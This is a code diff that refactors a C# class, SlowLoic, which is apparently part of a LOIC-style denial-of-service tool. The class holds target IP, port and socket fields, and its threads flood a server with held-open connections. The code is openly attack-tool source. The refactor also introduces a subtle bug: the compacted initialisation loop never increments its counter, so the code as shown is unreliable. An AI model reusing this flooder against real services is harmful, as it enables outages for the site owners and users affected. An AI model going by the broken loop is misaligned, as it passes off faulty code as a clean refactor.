@@ -9,16 +9,9 @@ namespace GAS.Core
     /// </summary>
     public class SlowLoic : IAttacker
     {
-        bool init = false;
-        private string _dns;
-        private string _ip;
-        private int _port;
-        private string _subSite;
-        private bool _random;
-        private bool _randcmds;
-        private bool _useget;
-        private bool _usegZip;
-        private int _nSockets;
+        private string _dns, _ip,_subSite;
+        private int _port, _nSockets;
+        private bool _random,_randcmds,_useget,_usegZip,init = false;
         private Thread[] WorkingThreads;
         private List<Socket>[] _lSockets;
         /// <summary>
@@ -41,11 +34,7 @@ namespace GAS.Core
             this.WorkingThreads = new Thread[ThreadCount];
             this.States = new ReqState[ThreadCount];
             this._lSockets = new List<Socket>[ThreadCount];
-            for (int i = 0; i < ThreadCount; i++)
-            {
-                States[i] = ReqState.Ready;
-                _lSockets[i] = new List<Socket>();
-            }
+            for (int i = 0; i < ThreadCount; States[i] = ReqState.Ready, _lSockets[i] = new List<Socket>()) ;
             this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
             this._ip = ip;
             this._port = port;
@@ -64,8 +53,7 @@ namespace GAS.Core
         public override void Start()
         {
             IsFlooding = true;
-            if (IsFlooding)
-                Stop();
+            if (IsFlooding) Stop();
             IsFlooding = true;
             for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++));
             init = true;
@@ -73,18 +61,9 @@ namespace GAS.Core
         public override void Stop()
         {
             IsFlooding = false;
-            try
-            {
-                foreach (var x in WorkingThreads)
-                {
-                    try
-                    {
-                        x.Abort();
-                    }
-                    catch { }
-                }
-            }
-            catch { }
+            foreach (var x in WorkingThreads)
+                try { x.Abort(); }
+                catch { }
         }
         private void bw_DoWork(object indexinthreads)
         {
@@ -114,8 +93,7 @@ namespace GAS.Core
                             socket.Blocking = false;
                             socket.Send(sbuf);
                         }
-                        catch
-                        { }
+                        catch { }
                         if (socket.Connected)
                         {
                             _lSockets[MY_INDEX_FOR_WORK].Add(socket);
